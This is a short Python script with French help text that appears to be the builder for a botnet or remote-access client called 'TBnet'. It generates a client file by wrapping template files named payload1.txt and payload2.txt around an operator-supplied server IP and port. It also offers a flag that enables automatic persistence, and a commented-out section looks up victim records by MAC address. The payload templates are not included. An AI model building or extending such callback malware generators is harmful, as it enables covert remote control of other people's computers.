import argparse

parser = argparse.ArgumentParser(description='TBnet Help Menu')
parser.add_argument('--host', type=str, required=True, dest='host',\
                    help='Ip du Server')
parser.add_argument('--port', type=int, required=True, dest='port',\
                    help='Port du Server')
parser.add_argument('--name', type=str, required=False, dest='name', default="client",\
                    help='Définir nom du fichier')
parser.add_argument('--persistance', type=bool, required=False, dest='persistance', default=False,\
                    help='Active la persistance automatique')

args = parser.parse_args()

class GenClient:

    pathDirFichier = "./code/"
    pathDirOutput = "./output/"

    def GenererClient(self, ip, port, persistance, name):
        fichier = open(self.pathDirOutput + name + ".py", "w")
        fichier.write(self.ReturnFichier("payload1.txt"))
        fichier.write("\n    host = \"" + ip + "\"\n    port = " + str(port) + "\n")
        fichier.write(self.ReturnFichier("payload2.txt"))
        fichier.close()

    def ReturnFichier(self, nom_fichier):
        fichier = open(self.pathDirFichier + nom_fichier, "r")
        text = fichier.read()
        fichier.close()
        return text

GenClient().GenererClient(args.host, args.port, args.persistance, args.name)


"""
def ReturnInfo(macAdress, info_name):
    fichier = open(pathDb + TestMacAddress(pathDb, extDb, macAdress)[1], "r")
    data = json.load(fichier)
    print(data[info_name])
    info = data[info_name]
    fichier.close
    return info

def TestMacAddress(path,extension,macAddress):
    list_dir = []
    list_dir = os.listdir(path)
    count = 0
    for file in list_dir:
        if file.endswith(extension): # eg: '.txt'
            count += 1
            fileName, fileExtension = os.path.splitext(file)
            if TrouverMac(fileName + fileExtension) == macAddress:
                print("l'adresse mac corespond")
                return True, fileName + fileExtension
            else:
                print("l'adresse mac ne corespond pas")
    return False, "Null"
"""